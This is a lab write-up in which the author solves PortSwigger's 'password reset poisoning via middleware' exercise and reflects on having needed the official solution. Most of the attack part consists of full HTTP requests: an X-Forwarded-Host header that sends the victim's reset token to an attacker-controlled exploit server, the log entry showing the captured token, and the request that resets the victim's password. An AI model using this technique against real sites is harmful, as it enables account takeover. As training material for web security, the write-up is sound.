# Password reset poisoning via middleware
[Password reset poisoning via middleware](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)

# Thought Process

- Let's access the lab and see what we're dealing with. The name of the lab gives us a hint, but we need to investiage ourselves.

- Alright, so going through all the password reset steps, it seems we have a POST request that triggers the password reset flow

```
POST /forgot-password HTTP/2
Host: 0ac4007903d1e91d80a6bc0100cc009e.web-security-academy.net
Cookie: session=b8wmSypsvExVL8BkW9VNvpamYf5GRwYS
Content-Length: 15
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: https://0ac4007903d1e91d80a6bc0100cc009e.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac4007903d1e91d80a6bc0100cc009e.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Priority: u=0, i
Connection: keep-alive

username=wiener
```

- Once we submit this, we visit the email client for our user and we see that we have an email with the following link to reset our password: `https://0ac4007903d1e91d80a6bc0100cc009e.web-security-academy.net/forgot-password?temp-forgot-password-token=xpk0m7pw7xya49o9hbhv6gfax26zjcr4`

- The most interesting bit is the `temp-forgot-password-token` query parameter; `xpk0m7pw7xya49o9hbhv6gfax26zjcr4`. Let's investigate this token further by passing it to [CyberChef](https://gchq.github.io/CyberChef/#input=eHBrMG03cHc3eHlhNDlvOWhiaHY2Z2ZheDI2empjcjQ).

- Hmmm no useful results. It seems like this token is not an easy nut to crack. We're probably on the wrong path here. Let's leave the token and find other angles to attack this.

- I've been trying for a while to pass in a `temp-forgot-password-token` parameter to the `forgot-password` endpoint trying to make the token static for the reset request for Carlos but to no avail. I always get an error `Invalid Token` which means that, even though the reset request is passing with this extra param, it's being ignored on the backend and the token is being generated correctly on the backend. Has to be something different.

- I kept going back and forth on multiple angles but nothing worked here. I think I'll just look at the solution here because I'm out of ideas.

- Yeah I had to look at the solution because I couldn't crack it myself. However I'm not sure how I was supposed to know about the solution without looking at it.

- It seems that the `X-Forwarded-Host` header is enabled on the backend and if I pass that host with our exploit server's URL, then the reset password request will be sent to our exploit server including the reset password token for Carlos;

```
POST /forgot-password HTTP/2
Host: 0ac4007903d1e91d80a6bc0100cc009e.web-security-academy.net
Cookie: session=b8wmSypsvExVL8BkW9VNvpamYf5GRwYS
Content-Length: 15
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: https://0ac4007903d1e91d80a6bc0100cc009e.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac4007903d1e91d80a6bc0100cc009e.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Priority: u=0, i
X-Forwarded-Host: exploit-0acb00ad0302e95980d7bbe60138009f.exploit-server.net

username=carlos
```

- After sending this request, we should check the access logs in the exploit server. We'll see an entry like this:
`10.0.3.233      2026-05-18 23:07:02 +0000 "GET /forgot-password?temp-forgot-password-token=ksney1yvo0hs38s8fxxac7lax48n5ptm HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"`

- We can see that the reset token for Carlos is `ksney1yvo0hs38s8fxxac7lax48n5ptm`. Using this token in the actual reset password request, will actually reset Carlos' password to be whatever we want. We can then use these credentials to login to Carlos' account.

```
POST /forgot-password?temp-forgot-password-token=ksney1yvo0hs38s8fxxac7lax48n5ptm HTTP/2
Host: 0ac4007903d1e91d80a6bc0100cc009e.web-security-academy.net
Content-Length: 101
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: https://0ac4007903d1e91d80a6bc0100cc009e.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ar;q=0.8
Priority: u=0, i

temp-forgot-password-token=ksney1yvo0hs38s8fxxac7lax48n5ptm&new-password-1=peter&new-password-2=peter
```

---

I'm actually not sure how I was supposed to know that I should be passing the `X-Forwarded-Host` header in this case. I must have missed something while studying the modules. BUT, that's why we're solving these labs and why we have a Solution section. Learnt something new today!